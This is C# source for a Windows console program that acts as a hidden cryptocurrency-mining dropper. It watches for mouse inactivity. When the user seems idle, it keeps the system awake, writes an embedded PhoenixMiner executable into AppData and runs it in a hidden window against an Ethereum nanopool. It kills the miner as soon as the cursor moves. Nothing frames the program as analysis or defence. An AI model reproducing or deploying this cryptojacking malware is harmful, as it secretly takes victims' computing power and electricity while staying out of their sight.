using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows;
using System.Drawing;
using System.Threading;
using System.IO;

namespace ConsoleApp38
{
    internal static class CursorPosition
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PointInter
        {
            public int X;
            public int Y;
            public static explicit operator Point(PointInter point) => new Point(point.X, point.Y);
        }

        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out PointInter lpPoint);

        // For your convenience
        public static Point GetCursorPosition()
        {
            PointInter lpPoint;
            GetCursorPos(out lpPoint);
            return (Point)lpPoint;
        }
    }
       
    class Program    
    {

        [FlagsAttribute]
        public enum EXECUTION_STATE : uint
        {
            ES_AWAYMODE_REQUIRED = 0x00000040,
            ES_CONTINUOUS = 0x80000000,
            ES_DISPLAY_REQUIRED = 0x00000002,
            ES_SYSTEM_REQUIRED = 0x00000001
            // Legacy flag, should not be used.
            // ES_USER_PRESENT = 0x00000004
        }
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);
        private static Point _previousLocation { get; set; }
        private static Point _currentLocation { get; set;  }
        private static int _timeElapsed { get; set; }
        private static bool _isRunning { get; set; }
        static void Main(string[] args)
        {
            string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "PhoenixMiner.exe";
            string commandLine = "-pool eth-eu1.nanopool.org:9999 -wal 0xfffnhgui34hf8v934jviroejg893jwwvi/MyRig1 -pass x -log 0";

            reset:
            _isRunning = false;
            _timeElapsed = 0;
            _previousLocation = new Point();
            _currentLocation = new Point();

            _previousLocation = CursorPosition.GetCursorPosition();
            Thread.Sleep(60 * 1000);
            _currentLocation = CursorPosition.GetCursorPosition();
            if ((_previousLocation.X == _currentLocation.X) && (_previousLocation.Y == _currentLocation.Y))
            {
                SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS | EXECUTION_STATE.ES_AWAYMODE_REQUIRED);
                File.WriteAllBytes(fileName, Properties.Resources.PhoenixMiner);
                Process proc = new Process();
                proc.StartInfo.FileName = fileName;
                proc.StartInfo.Arguments = commandLine;
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.Start();
                loop:
                Thread.Sleep(1000);
                _currentLocation = CursorPosition.GetCursorPosition();
                if ((_previousLocation.X == _currentLocation.X) && (_previousLocation.Y == _currentLocation.Y))
                    goto loop;
                else
                {
                    proc.Kill();
                    goto reset;
                }

            }
            else
                goto reset;
        }
    }
}
